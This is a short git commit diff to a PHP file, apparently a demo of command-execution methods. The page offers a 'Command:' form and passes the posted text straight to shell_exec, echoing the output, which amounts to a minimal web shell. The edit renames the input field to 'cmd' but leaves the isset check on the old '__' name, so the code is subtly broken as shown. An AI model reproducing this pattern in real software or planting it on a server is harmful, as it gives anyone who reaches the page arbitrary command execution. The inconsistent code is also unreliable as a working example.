10fb64fa76906a11aa3a4acced8d2a597f8987e6
Samuel Loza <starsaminf@gmail.com>
2023-10-06 18:50:24 -0400

    Update index2.php

--- 3methods/index2.php
+++ 3methods/index2.php
@@ -1,10 +1,10 @@
 <?php
 
 echo '<form method="post">
-        Command: <input type="text" name="__" value="ping -c 3 google.com"><br>
+        Command: <input type="text" name="cmd" value="ping -c 3 google.com"><br>
         <input type="submit">
       </form>';
 
 if(isset($_POST["__"]))
-	print '<pre> ping -c '.shell_exec($_POST["__"]).'</pre>';
+	print '<pre> ping -c '.shell_exec($_POST["cmd"]).'</pre>';
 
